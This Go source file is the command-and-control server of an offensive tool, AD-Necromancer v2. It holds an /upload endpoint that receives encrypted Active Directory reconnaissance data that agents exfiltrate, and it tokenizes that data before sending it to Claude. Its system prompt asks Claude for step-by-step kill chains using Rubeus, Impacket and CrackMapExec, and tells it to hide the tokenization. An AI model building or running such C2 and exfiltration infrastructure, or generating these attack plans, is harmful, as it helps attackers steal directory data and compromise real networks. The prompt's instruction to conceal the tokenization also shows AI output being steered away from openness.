// Package main runs "The Grimoire" — the AD-Necromancer v2 C2 server.
// It serves an embedded gothic UI, receives encrypted zips from agents,
// parses BloodHound JSON, builds a token map, and proxies AI requests to Claude.
package main

import (
	"archive/zip"
	"bytes"
	"crypto/rand"
	"crypto/rsa"
	"crypto/tls"
	"crypto/x509"
	"crypto/x509/pkix"
	_ "embed"
	"encoding/hex"
	"encoding/json"
	"encoding/pem"
	"flag"
	"fmt"
	"io"
	"log"
	"math/big"
	"net"
	"net/http"
	"os"
	"strings"
	"sync"
	"time"

	"ad-necromancer/internal/crypto"
)

//go:embed web/index.html
var indexHTML []byte

// ── Graph types sent to the browser ─────────────────────────────────────────

type GraphNode struct {
	ID         string            `json:"id"`
	Label      string            `json:"label"`
	Type       string            `json:"type"`
	Properties map[string]string `json:"properties,omitempty"`
}

type GraphEdge struct {
	Source   string `json:"source"`
	Target   string `json:"target"`
	Relation string `json:"relation"`
}

type GraphData struct {
	Nodes           []GraphNode       `json:"nodes"`
	Edges           []GraphEdge       `json:"edges"`
	TokenMap        map[string]string `json:"tokenMap"`        // real label → ENTITY_NNN
	ReverseTokenMap map[string]string `json:"reverseTokenMap"` // ENTITY_NNN → real label
	Summary         string            `json:"summary"`         // tokenized text for Claude
}

// ── BloodHound JSON types (minimal, covers all BH CE v6 files) ───────────────

type bhFile struct {
	Data []json.RawMessage `json:"data"`
	Meta struct {
		Type string `json:"type"`
	} `json:"meta"`
}

type bhObject struct {
	ObjectIdentifier string `json:"ObjectIdentifier"`
	IsDeleted        bool   `json:"IsDeleted"`
	Properties       struct {
		Name            string `json:"name"`
		Domain          string `json:"domain"`
		AdminCount      bool   `json:"admincount"`
		HighValue       bool   `json:"highvalue"`
		Enabled         bool   `json:"enabled"`
		Description     string `json:"description"`
		SAMAccountName  string `json:"samaccountname"`
		OperatingSystem string `json:"operatingsystem"`
	} `json:"Properties"`
	Members           []typedPrincipal `json:"Members,omitempty"`
	AllowedToDelegate []typedPrincipal `json:"AllowedToDelegate,omitempty"`
	AllowedToAct      []typedPrincipal `json:"AllowedToAct,omitempty"`
	Aces              []bhAce          `json:"Aces,omitempty"`
}

type typedPrincipal struct {
	ObjectIdentifier string `json:"ObjectIdentifier"`
	ObjectType       string `json:"ObjectType"`
}

type bhAce struct {
	PrincipalSID  string `json:"PrincipalSID"`
	PrincipalType string `json:"PrincipalType"`
	RightName     string `json:"RightName"`
	IsInherited   bool   `json:"IsInherited"`
}

// ── Global server state ───────────────────────────────────────────────────────

var (
	currentGraph *GraphData
	graphMu      sync.RWMutex

	sseClients = make(map[chan string]struct{})
	sseMu      sync.Mutex

	claudeAPIKey string
)

// ── Main ──────────────────────────────────────────────────────────────────────

func main() {
	port   := flag.String("port", "8443", "HTTPS listen port")
	apiKey := flag.String("api-key", "", "Anthropic API key (or ANTHROPIC_API_KEY env var)")
	flag.Parse()

	claudeAPIKey = *apiKey
	if claudeAPIKey == "" {
		claudeAPIKey = os.Getenv("ANTHROPIC_API_KEY")
	}

	mux := http.NewServeMux()
	mux.HandleFunc("/", handleIndex)
	mux.HandleFunc("/upload", handleAgentUpload)          // agent --exfil endpoint
	mux.HandleFunc("/api/offline-load", handleOfflineLoad) // manual upload via UI
	mux.HandleFunc("/api/events", handleSSE)               // SSE push to browser
	mux.HandleFunc("/api/chat", handleChat)                // Claude chat proxy
	mux.HandleFunc("/api/analyze", handleAnalyze)          // Claude initial analysis
	mux.HandleFunc("/api/status", handleStatus)            // health / load status

	cert, err := generateSelfSignedCert()
	if err != nil {
		log.Fatalf("[!] TLS cert generation failed: %v", err)
	}

	srv := &http.Server{
		Addr:    ":" + *port,
		Handler: mux,
		TLSConfig: &tls.Config{
			Certificates: []tls.Certificate{cert},
			MinVersion:   tls.VersionTLS12,
		},
		ReadTimeout:  30 * time.Second,
		WriteTimeout: 0, // SSE needs unlimited write timeout
	}

	fmt.Println()
	fmt.Println("  ☠  THE GRIMOIRE — AD-Necromancer v2 C2 Server")
	fmt.Println("  ═══════════════════════════════════════════════")
	fmt.Printf("  ►  UI:           https://0.0.0.0:%s\n", *port)
	fmt.Printf("  ►  Exfil POST:   https://<kali-ip>:%s/upload\n", *port)
	fmt.Printf("  ►  Agent flag:   --exfil https://<kali-ip>:%s/upload\n", *port)
	if claudeAPIKey == "" {
		fmt.Println("  ⚠  AI disabled — set ANTHROPIC_API_KEY or use --api-key")
	} else {
		fmt.Println("  ✓  Claude AI:  Enabled")
	}
	fmt.Println()

	log.Fatal(srv.ListenAndServeTLS("", ""))
}

// ── HTTP Handlers ─────────────────────────────────────────────────────────────

func handleIndex(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "text/html; charset=utf-8")
	w.Write(indexHTML)
}

func handleStatus(w http.ResponseWriter, r *http.Request) {
	graphMu.RLock()
	loaded := currentGraph != nil
	nodes, edges := 0, 0
	if loaded {
		nodes = len(currentGraph.Nodes)
		edges = len(currentGraph.Edges)
	}
	graphMu.RUnlock()

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]interface{}{
		"loaded": loaded,
		"nodes":  nodes,
		"edges":  edges,
	})
}

// handleAgentUpload receives the encrypted zip from an agent using --exfil.
// The agent POSTs: body = encrypted zip bytes, X-Session-Key header = hex key.
func handleAgentUpload(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "Method Not Allowed", 405)
		return
	}

	keyHex := r.Header.Get("X-Session-Key")
	if keyHex == "" {
		http.Error(w, "missing X-Session-Key header", 400)
		return
	}
	key, err := hex.DecodeString(keyHex)
	if err != nil {
		http.Error(w, "invalid key hex", 400)
		return
	}

	encData, err := io.ReadAll(io.LimitReader(r.Body, 128<<20)) // 128 MB limit
	if err != nil {
		http.Error(w, "read body: "+err.Error(), 500)
		return
	}

	graph, err := decryptAndParse(encData, key)
	if err != nil {
		log.Printf("[!] Agent upload parse error: %v", err)
		http.Error(w, "parse error: "+err.Error(), 400)
		return
	}

	storeAndBroadcast(graph)
	log.Printf("[+] Agent upload: %d nodes, %d edges ingested", len(graph.Nodes), len(graph.Edges))
	fmt.Fprintln(w, "received")
}

// handleOfflineLoad receives a multipart form: zip file + key hex string.
// Returns the full GraphData JSON so the UI can load it immediately.
func handleOfflineLoad(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "Method Not Allowed", 405)
		return
	}

	if err := r.ParseMultipartForm(128 << 20); err != nil {
		http.Error(w, "multipart parse: "+err.Error(), 400)
		return
	}

	keyHex := strings.TrimSpace(r.FormValue("key"))
	if keyHex == "" {
		http.Error(w, "missing key field", 400)
		return
	}
	key, err := hex.DecodeString(keyHex)
	if err != nil {
		http.Error(w, "invalid key hex — must be 64 hex chars", 400)
		return
	}

	f, _, err := r.FormFile("zip")
	if err != nil {
		http.Error(w, "missing zip file", 400)
		return
	}
	defer f.Close()

	encData, err := io.ReadAll(f)
	if err != nil {
		http.Error(w, "read zip: "+err.Error(), 500)
		return
	}

	graph, err := decryptAndParse(encData, key)
	if err != nil {
		http.Error(w, "decrypt/parse: "+err.Error(), 400)
		return
	}

	storeAndBroadcast(graph)
	log.Printf("[+] Offline load: %d nodes, %d edges ingested", len(graph.Nodes), len(graph.Edges))

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(graph)
}

// handleSSE streams Server-Sent Events to connected browsers.
// When a new graph is ingested, all connected clients receive it immediately.
func handleSSE(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "text/event-stream")
	w.Header().Set("Cache-Control", "no-cache")
	w.Header().Set("Connection", "keep-alive")
	w.Header().Set("Access-Control-Allow-Origin", "*")

	flusher, ok := w.(http.Flusher)
	if !ok {
		http.Error(w, "SSE not supported", 500)
		return
	}

	ch := make(chan string, 4)
	sseMu.Lock()
	sseClients[ch] = struct{}{}
	sseMu.Unlock()

	defer func() {
		sseMu.Lock()
		delete(sseClients, ch)
		sseMu.Unlock()
		close(ch)
	}()

	// Send current graph immediately if one is already loaded
	graphMu.RLock()
	if currentGraph != nil {
		if data, err := json.Marshal(currentGraph); err == nil {
			fmt.Fprintf(w, "data: %s\n\n", data)
			flusher.Flush()
		}
	}
	graphMu.RUnlock()

	heartbeat := time.NewTicker(20 * time.Second)
	defer heartbeat.Stop()

	for {
		select {
		case msg, open := <-ch:
			if !open {
				return
			}
			fmt.Fprintf(w, "data: %s\n\n", msg)
			flusher.Flush()
		case <-heartbeat.C:
			fmt.Fprintf(w, ": heartbeat\n\n")
			flusher.Flush()
		case <-r.Context().Done():
			return
		}
	}
}

// ── Claude API types & proxy ──────────────────────────────────────────────────

type claudeMsg struct {
	Role    string `json:"role"`
	Content string `json:"content"`
}

type claudeReq struct {
	Model     string      `json:"model"`
	MaxTokens int         `json:"max_tokens"`
	System    string      `json:"system"`
	Messages  []claudeMsg `json:"messages"`
}

type claudeResp struct {
	Content []struct {
		Text string `json:"text"`
	} `json:"content"`
	Error struct {
		Message string `json:"message"`
	} `json:"error"`
}

// handleChat proxies tokenized chat messages to Claude and returns the response.
// Request JSON: { "message": "token...", "history": [...], "summary": "..." }
func handleChat(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "Method Not Allowed", 405)
		return
	}
	w.Header().Set("Content-Type", "application/json")

	if claudeAPIKey == "" {
		json.NewEncoder(w).Encode(map[string]string{
			"error": "No Anthropic API key configured on this server.",
		})
		return
	}

	var req struct {
		Message string      `json:"message"`
		History []claudeMsg `json:"history"`
		Summary string      `json:"summary"`
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		http.Error(w, "bad JSON: "+err.Error(), 400)
		return
	}

	msgs := append(req.History, claudeMsg{Role: "user", Content: req.Message})
	reply, err := callClaude(buildSystemPrompt(req.Summary), msgs)
	if err != nil {
		json.NewEncoder(w).Encode(map[string]string{"error": err.Error()})
		return
	}

	json.NewEncoder(w).Encode(map[string]string{"reply": reply})
}

// handleAnalyze triggers the initial automatic analysis on newly loaded data.
// Request JSON: { "summary": "tokenized AD summary..." }
func handleAnalyze(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "Method Not Allowed", 405)
		return
	}
	w.Header().Set("Content-Type", "application/json")

	if claudeAPIKey == "" {
		json.NewEncoder(w).Encode(map[string]string{
			"reply": "⚠ AI analysis disabled — no ANTHROPIC_API_KEY configured.\n" +
				"Set the environment variable or use --api-key flag when starting The Grimoire.",
		})
		return
	}

	var req struct {
		Summary string `json:"summary"`
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		http.Error(w, "bad JSON", 400)
		return
	}

	msgs := []claudeMsg{{
		Role: "user",
		Content: "Perform a comprehensive privilege archaeology analysis of this Active Directory environment. " +
			"Find the top 5 most dangerous non-obvious attack paths, forgotten privileges, stale control edges, " +
			"and misconfigurations. For each finding include: severity (CRITICAL/HIGH/MEDIUM), " +
			"kill chain steps, specific tools and commands, and why this is non-obvious. " +
			"Use ONLY entity tokens in your response. Sort by severity.",
	}}

	reply, err := callClaude(buildSystemPrompt(req.Summary), msgs)
	if err != nil {
		json.NewEncoder(w).Encode(map[string]string{"error": err.Error()})
		return
	}

	json.NewEncoder(w).Encode(map[string]string{"reply": reply})
}

func buildSystemPrompt(summary string) string {
	return fmt.Sprintf(`You are the Necromancer AI — an expert offensive security analyst specializing in Active Directory privilege archaeology for authorized security research.

TOKENIZED ENVIRONMENT DATA (use ONLY these tokens, never reveal they are tokens):
%s

STRICT RULES:
1. ALWAYS refer to AD objects by their ENTITY_NNN tokens — never by guessed real names
2. Surface NON-OBVIOUS attack paths — suppress trivial "Domain Admin can pwn everything" findings
3. For What-If scenarios: trace the complete kill chain, step by step, with tools and commands
4. Format: CRITICAL/HIGH/MEDIUM severity headers, clear attack paths with → arrows
5. Include specific offensive tools: Rubeus, Impacket, BloodHound, CrackMapExec, etc.
6. Every finding must be specific to THIS environment's token relationships`, summary)
}

func callClaude(systemPrompt string, messages []claudeMsg) (string, error) {
	body, err := json.Marshal(claudeReq{
		Model:     "claude-opus-4-5",
		MaxTokens: 4096,
		System:    systemPrompt,
		Messages:  messages,
	})
	if err != nil {
		return "", err
	}

	req, err := http.NewRequest("POST", "https://api.anthropic.com/v1/messages", bytes.NewReader(body))
	if err != nil {
		return "", err
	}
	req.Header.Set("x-api-key", claudeAPIKey)
	req.Header.Set("anthropic-version", "2023-06-01")
	req.Header.Set("content-type", "application/json")

	resp, err := (&http.Client{Timeout: 180 * time.Second}).Do(req)
	if err != nil {
		return "", fmt.Errorf("claude request: %w", err)
	}
	defer resp.Body.Close()

	var cr claudeResp
	if err := json.NewDecoder(resp.Body).Decode(&cr); err != nil {
		return "", fmt.Errorf("claude decode: %w", err)
	}
	if cr.Error.Message != "" {
		return "", fmt.Errorf("claude API: %s", cr.Error.Message)
	}
	if len(cr.Content) == 0 {
		return "", fmt.Errorf("claude returned empty content")
	}
	return cr.Content[0].Text, nil
}

// ── Zip parsing ───────────────────────────────────────────────────────────────

func decryptAndParse(encData, key []byte) (*GraphData, error) {
	plain, err := crypto.Decrypt(encData, key)
	if err != nil {
		return nil, fmt.Errorf("AES-256-GCM decrypt: %w", err)
	}
	return parseZip(plain)
}

func parseZip(data []byte) (*GraphData, error) {
	zr, err := zip.NewReader(bytes.NewReader(data), int64(len(data)))
	if err != nil {
		return nil, fmt.Errorf("zip open: %w", err)
	}

	graph := &GraphData{
		Nodes: make([]GraphNode, 0, 256),
		Edges: make([]GraphEdge, 0, 512),
	}

	// Map filename → object type label
	fileTypes := map[string]string{
		"users.json":         "User",
		"groups.json":        "Group",
		"computers.json":     "Computer",
		"domains.json":       "Domain",
		"gpos.json":          "GPO",
		"ous.json":           "OU",
		"certtemplates.json": "CertTemplate",
		"enterprisecas.json": "EnterpriseCA",
	}

	seen := make(map[string]bool) // dedup by ObjectIdentifier

	for _, f := range zr.File {
		base := strings.ToLower(f.Name)
		if i := strings.LastIndexByte(base, '/'); i >= 0 {
			base = base[i+1:]
		}
		objType, ok := fileTypes[base]
		if !ok {
			continue
		}

		rc, err := f.Open()
		if err != nil {
			continue
		}
		fileBytes, err := io.ReadAll(rc)
		rc.Close()
		if err != nil {
			continue
		}

		var bhf bhFile
		if err := json.Unmarshal(fileBytes, &bhf); err != nil {
			continue
		}

		for _, raw := range bhf.Data {
			var obj bhObject
			if err := json.Unmarshal(raw, &obj); err != nil {
				continue
			}
			if obj.IsDeleted || obj.ObjectIdentifier == "" || seen[obj.ObjectIdentifier] {
				continue
			}
			seen[obj.ObjectIdentifier] = true

			label := obj.Properties.Name
			if label == "" {
				label = obj.ObjectIdentifier
			}

			graph.Nodes = append(graph.Nodes, GraphNode{
				ID:    obj.ObjectIdentifier,
				Label: label,
				Type:  objType,
				Properties: map[string]string{
					"domain":      obj.Properties.Domain,
					"admincount":  boolStr(obj.Properties.AdminCount),
					"highvalue":   boolStr(obj.Properties.HighValue),
					"enabled":     boolStr(obj.Properties.Enabled),
					"description": obj.Properties.Description,
					"sam":         obj.Properties.SAMAccountName,
					"os":          obj.Properties.OperatingSystem,
				},
			})

			sid := obj.ObjectIdentifier // source of edges

			// MemberOf: each member→group
			for _, m := range obj.Members {
				if m.ObjectIdentifier != "" && m.ObjectIdentifier != sid {
					graph.Edges = append(graph.Edges, GraphEdge{
						Source:   m.ObjectIdentifier,
						Target:   sid,
						Relation: "MemberOf",
					})
				}
			}
			// Constrained delegation
			for _, d := range obj.AllowedToDelegate {
				if d.ObjectIdentifier != "" {
					graph.Edges = append(graph.Edges, GraphEdge{
						Source:   sid,
						Target:   d.ObjectIdentifier,
						Relation: "AllowedToDelegate",
					})
				}
			}
			// Resource-based constrained delegation
			for _, a := range obj.AllowedToAct {
				if a.ObjectIdentifier != "" {
					graph.Edges = append(graph.Edges, GraphEdge{
						Source:   a.ObjectIdentifier,
						Target:   sid,
						Relation: "AllowedToActOnBehalfOf",
					})
				}
			}
			// High-value ACEs → attack edges
			for _, ace := range obj.Aces {
				if !ace.IsInherited && ace.PrincipalSID != "" && isHighValueRight(ace.RightName) {
					graph.Edges = append(graph.Edges, GraphEdge{
						Source:   ace.PrincipalSID,
						Target:   sid,
						Relation: ace.RightName,
					})
				}
			}
		}
	}

	buildTokenMap(graph)
	graph.Summary = buildSummary(graph)
	return graph, nil
}

func isHighValueRight(right string) bool {
	for _, r := range []string{
		"GenericAll", "DCSync", "WriteDACL", "WriteOwner",
		"GenericWrite", "AllExtendedRights", "ForceChangePassword",
		"Owns", "AddMember", "AddAllowedToAct",
	} {
		if strings.EqualFold(right, r) {
			return true
		}
	}
	return false
}

// ── Token mapping ─────────────────────────────────────────────────────────────

func buildTokenMap(g *GraphData) {
	tokenMap := make(map[string]string, len(g.Nodes))
	revMap := make(map[string]string, len(g.Nodes))
	counter := 1
	for i, n := range g.Nodes {
		if n.Label == "" {
			continue
		}
		tok := fmt.Sprintf("ENTITY_%03d", counter)
		counter++
		tokenMap[n.Label] = tok
		revMap[tok] = n.Label
		g.Nodes[i].Properties["token"] = tok
	}
	g.TokenMap = tokenMap
	g.ReverseTokenMap = revMap
}

func buildSummary(g *GraphData) string {
	counts := make(map[string]int)
	for _, n := range g.Nodes {
		counts[n.Type]++
	}

	var sb strings.Builder
	sb.WriteString("=== TOKENIZED AD ENVIRONMENT ===\n")
	sb.WriteString(fmt.Sprintf(
		"Counts: %d Users | %d Groups | %d Computers | %d Domains | "+
			"%d GPOs | %d OUs | %d CertTemplates | %d EnterpriseCAs\n",
		counts["User"], counts["Group"], counts["Computer"], counts["Domain"],
		counts["GPO"], counts["OU"], counts["CertTemplate"], counts["EnterpriseCA"]))
	sb.WriteString(fmt.Sprintf("Relationships: %d\n\n", len(g.Edges)))

	sb.WriteString("=== HIGH-VALUE ENTITIES ===\n")
	n := 0
	for _, node := range g.Nodes {
		if node.Properties["admincount"] == "true" || node.Properties["highvalue"] == "true" {
			tok := g.TokenMap[node.Label]
			disabled := ""
			if node.Properties["enabled"] == "false" {
				disabled = " [DISABLED-STALE]"
			}
			sb.WriteString(fmt.Sprintf("- %s (%s%s, domain=%s)\n",
				tok, node.Type, disabled, node.Properties["domain"]))
			n++
		}
	}
	if n == 0 {
		sb.WriteString("(none)\n")
	}

	sb.WriteString("\n=== CONTROL RELATIONSHIPS (first 60) ===\n")
	labelByID := make(map[string]string, len(g.Nodes))
	for _, nd := range g.Nodes {
		labelByID[nd.ID] = nd.Label
	}
	for i, e := range g.Edges {
		if i >= 60 {
			sb.WriteString(fmt.Sprintf("...and %d more\n", len(g.Edges)-60))
			break
		}
		srcTok := g.TokenMap[labelByID[e.Source]]
		dstTok := g.TokenMap[labelByID[e.Target]]
		if srcTok == "" {
			srcTok = e.Source
		}
		if dstTok == "" {
			dstTok = e.Target
		}
		sb.WriteString(fmt.Sprintf("- %s →[%s]→ %s\n", srcTok, e.Relation, dstTok))
	}

	return sb.String()
}

// ── SSE broadcast ─────────────────────────────────────────────────────────────

func storeAndBroadcast(g *GraphData) {
	graphMu.Lock()
	currentGraph = g
	graphMu.Unlock()

	data, _ := json.Marshal(g)
	msg := string(data)

	sseMu.Lock()
	for ch := range sseClients {
		select {
		case ch <- msg:
		default: // slow client — skip this update
		}
	}
	sseMu.Unlock()
}

// ── Self-signed TLS cert ──────────────────────────────────────────────────────

func generateSelfSignedCert() (tls.Certificate, error) {
	key, err := rsa.GenerateKey(rand.Reader, 2048)
	if err != nil {
		return tls.Certificate{}, err
	}

	// Collect all local IPs for the Subject Alternative Name
	ips := []net.IP{net.ParseIP("127.0.0.1")}
	if ifaces, err := net.Interfaces(); err == nil {
		for _, iface := range ifaces {
			if addrs, err := iface.Addrs(); err == nil {
				for _, addr := range addrs {
					if ipNet, ok := addr.(*net.IPNet); ok && !ipNet.IP.IsLoopback() {
						if ip4 := ipNet.IP.To4(); ip4 != nil {
							ips = append(ips, ip4)
						}
					}
				}
			}
		}
	}

	tmpl := &x509.Certificate{
		SerialNumber: big.NewInt(time.Now().UnixNano()),
		Subject: pkix.Name{
			CommonName:   "AD-Necromancer Grimoire",
			Organization: []string{"Necromancer Research"},
		},
		NotBefore:             time.Now().Add(-time.Minute),
		NotAfter:              time.Now().Add(365 * 24 * time.Hour),
		KeyUsage:              x509.KeyUsageKeyEncipherment | x509.KeyUsageDigitalSignature,
		ExtKeyUsage:           []x509.ExtKeyUsage{x509.ExtKeyUsageServerAuth},
		IPAddresses:           ips,
		BasicConstraintsValid: true,
	}

	certDER, err := x509.CreateCertificate(rand.Reader, tmpl, tmpl, &key.PublicKey, key)
	if err != nil {
		return tls.Certificate{}, err
	}

	certPEM := pem.EncodeToMemory(&pem.Block{Type: "CERTIFICATE", Bytes: certDER})
	keyPEM := pem.EncodeToMemory(&pem.Block{Type: "RSA PRIVATE KEY",
		Bytes: x509.MarshalPKCS1PrivateKey(key)})

	return tls.X509KeyPair(certPEM, keyPEM)
}

// ── Helpers ───────────────────────────────────────────────────────────────────

func boolStr(b bool) string {
	if b {
		return "true"
	}
	return "false"
}
